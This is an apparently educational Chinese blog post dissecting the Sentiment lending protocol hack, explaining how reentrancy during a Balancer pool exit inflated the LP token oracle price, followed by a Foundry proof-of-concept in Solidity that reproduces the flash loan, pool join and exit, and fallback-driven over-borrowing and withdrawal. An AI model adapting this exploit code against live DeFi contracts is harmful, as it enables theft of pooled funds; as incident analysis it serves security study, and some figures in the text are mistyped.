<!--StartFragment-->

# 一. Sentiment 的背景知识

## 不足额抵押
Sentiment 特点就一句话`不足额抵押`。

**超额抵押**
众所周知，大部分借贷项目都是超额抵押，比如抵押价值120U的Token，然后最多能借贷100U，这就是超额抵押。原因也很简单，就怕借款人跑路。

**不足额抵押**
知道超额抵押，就会感觉`不足额抵押`有点扯，难道项目是个慈善活动。开玩笑，项目方都是资本家，怎么可能犯傻，Sentiment做了保护，`不足额抵押`的借贷token不会直接给用户，而是存到一个和用户一一对应的Account合约里，用户可以指挥Account拿着资产去其他defi比如aave，balance投资，但是不能取出来。


多说一句，`不足额抵押`本质上也是解决流动性问题，提升资本利用效率。市场上，钱就那么多，谁能解决效率问题，钱就去哪里！




## Sentiment内部的角色与分工
- AccountManager：大管家，接受用户的请求，然后在Sentiment内部分工，下面3个是小弟。
- Account：保存用户的资产和负债，负责拿着用户的钱出去投资。
- Controller：初级审计员，检查Account的钱去哪里投资，如果拿去张三的马甲投资，直接就否决。只能去Aave，Balance这些Sentiment的白名单合作伙伴才可以。
- RiskEngine：我是风控专家，专门检查客户的仓位是否健康，是否要爆仓。

# 二. 攻击流程

## 概述攻击流程
- step1：通过Sentiment，到Balancer的`pair(B-33WETH-33WBTC-33USDC)`，存入50个ETH。
- step2：绕过Sentiment，亲自到Balancer的`pair(B-33WETH-33WBTC-33USDC)`，存入10,000个EWTH，606WBTC，18,000,000USDC。
- step3：攻击者到Balancer的`pair(B-33WETH-33WBTC-33USDC)`取款，存入5,000个`ETH`，606WBTC，9,000,000USDC。（`ETH`触发了fallback，从而引发了重入攻击。）
- step4：`fallback`
  在`fallback`中，张三向Sentiment发起了借款，记得 step2的50个WETH的存款吗，此时有了LP Token，作为抵押物就可以借款。具体如下：
  step4.1：借贷 461,00个USDC_e，361,00个USDT，81个WETH，125,000个FRAX。，再去Curve把FRAX换成USDC_e。
  step4.2：通过Sentiment将step4.1 借到的钱，都借给AaveV3。
  step4.3：将step4.2 借给AaveV3的钱，取出来给攻击人自己。
- step5：归还闪电贷，攻击结束。


## 详解攻击流程

### step1解析
通过Sentiment，到Balancer的`pair(B-33WETH-33WBTC-33USDC)`，存入50个ETH。

![6lending_sentiment_1_flow1.png](https://img.learnblockchain.cn/attachments/2023/12/Q0FKhB2t656ed7ecd3393.png)

### step2解析
绕过Sentiment，亲自到Balancer的`pair(B-33WETH-33WBTC-33USDC)`，存入10,000个EWTH，606WBTC，18,000,000USDC。

![6lending_sentiment_2_flow2.png](https://img.learnblockchain.cn/attachments/2023/12/cLWO5MjI656eda3c75a02.png)


### step3解析
攻击者到Balancer的`pair(B-33WETH-33WBTC-33USDC)`取款，取走所有存款。（`ETH`触发了fallback，从而引发了重入攻击。）


![6lending_sentiment_3_flow3.png](https://img.learnblockchain.cn/attachments/2023/12/iTPJ5MwX657bee54cea4a.png)


**注意，step3没有执行完，逻辑就进入了step4`fallback` ！！！**
<br>

### step4-`fallback`解析

在`fallback`中，张三向Sentiment发起了借款，记得 step2的50个WETH的存款吗，此时有了LP Token，作为抵押物就可以借款。但是能多少呢？需要一个Balancer给出**LP**的定价。定价的活就是`WeightedBalancerLPOracle`来负责。


![6lending_sentiment_4_flow4.png](https://img.learnblockchain.cn/attachments/2023/12/Nd1l0Ffg656ee8d320228.png)

- step4.1：借贷 461,00个USDC_e，361,00个USDT，81个WETH，125,000个FRAX。，再去Curve把FRAX换成USDC_e。

![6lending_sentiment_9_borrow.png](https://img.learnblockchain.cn/attachments/2023/12/KXxBS19d65795d91ccbab.png)

- step4.2：通过Sentiment将step4.1 借到的钱，都借给AaveV3。

![6lending_sentiment_10_supply.png](https://img.learnblockchain.cn/attachments/2023/12/Rby67WHg65795ef48ed90.png)

- step4.3：将step4.2 借给AaveV3的钱，取出来给攻击人自己。

![6lending_sentiment_11_withdraw.png](https://img.learnblockchain.cn/attachments/2023/12/CvllVhOk65795ff43d7f1.png)

### step5解析：
归还闪电贷，攻击结束。
没啥说的，就一点别忘记approve。归还闪电贷有两类：1你主动转账归还 2你approve，债主主动来扣钱。AaveV3是后者，所以记得approve。




# 三. LP 价格是攻击的关键

前面讲了整个流程，但是价格的问题一带而过，这个问题值得单独讲讲。

## 简单回顾下：

step1向Balancer存钱，step2向Balancer存钱，step3把step2在Balance存的钱取出来，这些钱包括ETH，引发隐式调用fallback，在fallback中开启借借借模式。

翻译成人话：step1存钱，得到了一定数量的Lp Token，作为抵押品。如果这些LP Token价值100U，你就可以抵押金额为100U，来计算借款额度。如果这些LP Token价值10000U，你就可以抵押金额为10000U，来计算借款额度。

## LP 价格公式
![6lending_sentiment_5_price.png](https://img.learnblockchain.cn/attachments/2023/12/qGhvL9kz656eeadca4f68.png)


## 借的额度远超过抵押的存款，为什么？
因为借款的那个时间点，此时此刻，LP Token的价值突然暴力拉升。

## 为什么LP Token价格大涨？

**分子没变，分母却变小了**。


![6lending_sentiment_12_step关系.png](https://img.learnblockchain.cn/attachments/2023/12/cFK5soyA6579750dce231.png)



## PhaIcon截图看分子分母的变化：

![6lending_sentiment_6_price_phaIcon.png](https://img.learnblockchain.cn/attachments/2023/12/nXf8DNMb65708d4103ebb.png)

trace信息可以提取出如下数据：

![6lending_sentiment_7_price_analyze.png](https://img.learnblockchain.cn/attachments/2023/12/FoQULmsO6571a54fa6805.png)

## 从数据的角度看LP Price价格变化
![6lending_sentiment_8_price_health.png](https://img.learnblockchain.cn/attachments/2023/12/zHOC9V996571b365a65be.png)


- joinPool2: 0.22e18
- borrow1: 3.55e18
  价格暴力拉升了16倍，意味着你的贷款额度也增加了16倍。
  **需要强调一句，攻击者没有借特别多资产，因为Sentiment的稳定币就没有那么多。**


流程和价格都分析完了，写POC就简单了。

# 四. POC

<!--StartFragment-->

## 准备工作


### 最佳学习资料：[DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs)

[SunWeb3Sec: 3. 自己动手写POC1 (Price Oracle Manipulation)](https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/03\_write_your_own_poc)\
[SunWeb3Sec: 4. 自己动手写POC2 - MEV Bot](https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/04\_write_your_own_poc/)\
[SunWeb3Sec: 6. 自己动手写POC3 (Reentrancy)](https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/06\_write_your_own_poc/)

工程里有大量POC代码，非常推荐！！！



## 具体写POC逻辑

### aave闪电贷

```solidity
    function testExploit() public {
        address[] memory assets = new address[](3);
        assets[0] = address(WBTC);
        assets[1] = address(WETH);
        assets[2] = address(USDC_e);
        uint[] memory amounts = new uint[](3);
        amounts[0] = 606e8;
//        amounts[1] = 10050e18;
        amounts[1] = 10_050.1e18;
        amounts[2] = 18_000_000e6;
        uint[] memory interestRateModes = new uint[](3);
        interestRateModes[0]=0;
        interestRateModes[1]=0;
        interestRateModes[2]=0;
        bytes memory params = new bytes(0);
        console.log('before flashloan');
        aaveV3Pool.flashLoan(address(this), assets, amounts, interestRateModes,address(this), abi.encode(''), 0);
        finalInterest('after flashloan');
    }
```

### step1 通过Sentiment，到Balancer的`pair(B-33WETH-33WBTC-33USDC)`，存入50个ETH。



下面的代码很长，主要是参数多，没有难度。值得细说的是data是怎么确定的？
不明白可以看 **补充说明**。



知道了如何解码 两种data，写下面代码就没有难度了。

```solidity
    address accountAddress;
    function accountManagerExecJoinPool() internal{
        accountAddress = accountManager.openAccount(address(this));
        riskEngine = IRiskEngine(accountManager.riskEngine());
        account = Account(accountAddress);
        oracle = Oracle(riskEngine.oracle());

        WETH.approve(address(accountManager), 50e18);

        accountManager.deposit(accountAddress, address(WETH), 50e18);

        accountManager.approve(accountAddress, address(WETH), address(balanceVault), 50e18);

        bytes32 poolId = B_33WETH_33WBTC_33USDC_POOL.getPoolId();
        address sender = accountAddress;
        address recipient = accountAddress;
        address[] memory assets = new address[](3);
        assets[0] = address(WBTC);
        assets[1] = address(WETH);
        assets[2] = address(USDC_e);

        uint[] memory maxAmountsIn = new uint[](3);
        maxAmountsIn[0]=0;
        maxAmountsIn[1]=50e18;
        maxAmountsIn[2]=0;
        bytes memory userData = abi.encode(uint8(1), maxAmountsIn, 0);
        BalancerVault.JoinPoolRequest memory request = BalancerVault.JoinPoolRequest({
            assets:assets,
            maxAmountsIn:maxAmountsIn,
            userData:userData,
            fromInternalBalance:false
        });

        bytes memory data = abi.encodeWithSelector(balanceVault.joinPool.selector, poolId, sender, recipient, request);

        accountManager.exec(accountAddress, address(balanceVault), 0, data);

    }
```


### step2：绕过Sentiment，亲自到Balancer的`pair(B-33WETH-33WBTC-33USDC)`，存入10,000个EWTH，606WBTC，18,000,000USDC。


```solidity
    function joinPool() internal{
        WBTC.approve(address(balanceVault), 606e8);
        WETH.approve(address(balanceVault), 10_000e18);
        USDC_e.approve(address(balanceVault), 18_000_000e6);


        bytes32 poolId = B_33WETH_33WBTC_33USDC_POOL.getPoolId();
        address sender = address(this);//
        address recipient = address(this);
        address[] memory assets = new address[](3);
        assets[0] = address(WBTC);
        assets[1] = address(WETH);
        assets[2] = address(USDC_e);
        uint[] memory maxAmountsIn = new uint[](3);
        maxAmountsIn[0] = 606e8;
        maxAmountsIn[1] = 10_000e18;
        maxAmountsIn[2] = 18_000_000e6;

        bytes memory userData = abi.encode(uint8(1), maxAmountsIn, 0);
        BalancerVault.JoinPoolRequest memory request = BalancerVault.JoinPoolRequest({
            assets:assets,
            maxAmountsIn:maxAmountsIn,
            userData:userData,
            fromInternalBalance:false
        });
        balanceVault.joinPool{value:0.1e18}(poolId, sender, recipient, request);

    }
```



### step3：攻击者到Balancer的`pair(B-33WETH-33WBTC-33USDC)`取款，取走所有。（`ETH`触发了fallback，从而引发了重入攻击。）


```solidity
    function exitPool() internal{

        bytes32 poolId = B_33WETH_33WBTC_33USDC_POOL.getPoolId();
        address sender = address(this);
        address recipient = address(this);
        address[] memory assets = new address[](3);
        assets[0] = address(WBTC);
        assets[1] = address(0);//
        assets[2] = address(USDC_e);
        uint[] memory minAmountsOut = new uint[](3);
        minAmountsOut[0] = 606e8;
        minAmountsOut[1] = 5_000e18;//
        minAmountsOut[2] = 9_000_000e6;

        uint tokenIn =balancerPoolToken.balanceOf(address(this));//
        bytes memory userData = abi.encode(uint8(1), tokenIn);//
        BalancerVault.ExitPoolRequest memory request = BalancerVault.ExitPoolRequest({
            assets:assets,
            minAmountsOut:minAmountsOut,
            userData:userData,
            toInternalBalance:false
        });

        balanceVault.exitPool(poolId, sender, payable(recipient), request);

        WETH.deposit{value: address(this).balance}();

    }
```

<!--StartFragment-->

### step4：`fallback`
在`fallback`中，张三向Sentiment发起了借款，记得 step2的50个WETH的存款吗，此时有了LP Token，作为抵押物就可以借款。具体如下：
* step4.1：借贷 461,00个USDC_e，361,00个USDT，81个WETH，125,000个FRAX。，再去Curve把FRAX换成USDC_e。
* step4.2：通过Sentiment将step4.1 借到的钱，都借给AaveV3。
* step4.3：将step4.2 借给AaveV3的钱，取出来给攻击人自己。


```solidity
    fallback() external payable {
        console.log("fallback");
        emit log_named_decimal_uint("fallback eth" , msg.value, 18);
        if(count > 1){
            accountManagerBorrow();
        }
        count++;
    }
    function accountManagerBorrow() public{

        accountManager.borrow(address(accountAddress), address(USDC_e), 461_000 * 1e6);
        accountManager.borrow(address(accountAddress), address(USDT), 361_000 * 1e6);
        accountManager.borrow(address(accountAddress), address(WETH), 81e18);
        accountManager.borrow(address(accountAddress), address(FRAX), 125_000 * 1e18);

        accountManager.approve(address(accountAddress),address(FRAX), CurvePool_FRAXBP, type(uint).max);
        accountManager.exec(address(accountAddress), CurvePool_FRAXBP, 0, abi.encodeWithSignature("exchange(int128,int128,uint256,uint256)", 0, 1, 120_000 * 1e18, 1));//exchange 稳定币
        accountManager.approve(address(accountAddress),address(USDC_e), address(aaveV3Pool), type(uint).max);
        accountManager.approve(address(accountAddress),address(USDT), address(aaveV3Pool), type(uint).max);
        accountManager.approve(address(accountAddress),address(WETH), address(aaveV3Pool), type(uint).max);

        accountManager.exec(address(accountAddress), address(aaveV3Pool), 0, abi.encodeWithSignature("supply(address,uint256,address,uint16)", address(USDC_e), 580_000 * 1e6, address(accountAddress), 0));
        accountManager.exec(address(accountAddress), address(aaveV3Pool), 0, abi.encodeWithSignature("supply(address,uint256,address,uint16)", address(USDT), 360_000 * 1e6, address(accountAddress), 0));
        accountManager.exec(address(accountAddress), address(aaveV3Pool), 0, abi.encodeWithSignature("supply(address,uint256,address,uint16)", address(WETH), 80 * 1e18, address(accountAddress), 0));
        accountManager.exec(address(accountAddress), address(aaveV3Pool), 0, abi.encodeWithSignature("withdraw(address,uint256,address)", address(USDC_e), type(uint).max, address(this)));
        accountManager.exec(address(accountAddress), address(aaveV3Pool), 0, abi.encodeWithSignature("withdraw(address,uint256,address)", address(USDT), type(uint).max, address(this)));
        accountManager.exec(address(accountAddress), address(aaveV3Pool), 0, abi.encodeWithSignature("withdraw(address,uint256,address)", address(WETH), type(uint).max, address(this)));

    }
```


### step5：归还闪电贷，攻击结束。
AaveV3 自己扣款，你approve即可。

```solidity
        WETH.approve(address(aaveV3Pool), amounts[1]+premiums[1]);
        USDC_e.approve(address(aaveV3Pool), amounts[2]+premiums[2]);
        WBTC.approve(address(aaveV3Pool), amounts[0]+premiums[0]);
```

<!--EndFragment-->





# 五. 补充说明

## joinPool的data是怎么来的?
看phaIcon是一串很长的字节数组：

![image.png](https://img.learnblockchain.cn/attachments/2023/12/3BgvyDGB6579b7e6b96ee.png)

这个可以用foundry命令解析：
`cast 4byte-decode 0x.....`

效果如下：

红色框就是解析出来的结果，
![image.png](https://img.learnblockchain.cn/attachments/2023/12/hXfHW2WS6579b8ecb5037.png)

结果中还有一串字节数组（绿色框），注意这传数据不能再用
`cast 4byte-decode 0x.....`解析，如何解析需要具体看Balancer代码逻辑。


拷贝如下代码（取自`WeightedPoolUserDataHelpers.sol`）到remix：
```solidity
    enum JoinKind { INIT, EXACT_TOKENS_IN_FOR_BPT_OUT, TOKEN_IN_FOR_EXACT_BPT_OUT }


    function exactTokensInForBptOut(bytes memory self)
        external 
        pure
        returns (JoinKind value1, uint256[] memory amountsIn, uint256 minBPTAmountOut)
    {
        (value1, amountsIn, minBPTAmountOut) = abi.decode(self, (JoinKind, uint256[], uint256));
    }
```
输入待解析的字节数组
解析结果如下：
![image.png](https://img.learnblockchain.cn/attachments/2023/12/CrIW8vxz6579c1267dacf.png)
于是有了

```solidity
        uint[] memory maxAmountsIn = new uint[](3);
        maxAmountsIn[0]=0;
        maxAmountsIn[1]=50e18;
        maxAmountsIn[2]=0;
        bytes memory userData = abi.encode(uint8(1), maxAmountsIn, 0);
```


<!--EndFragment-->



<!--EndFragment-->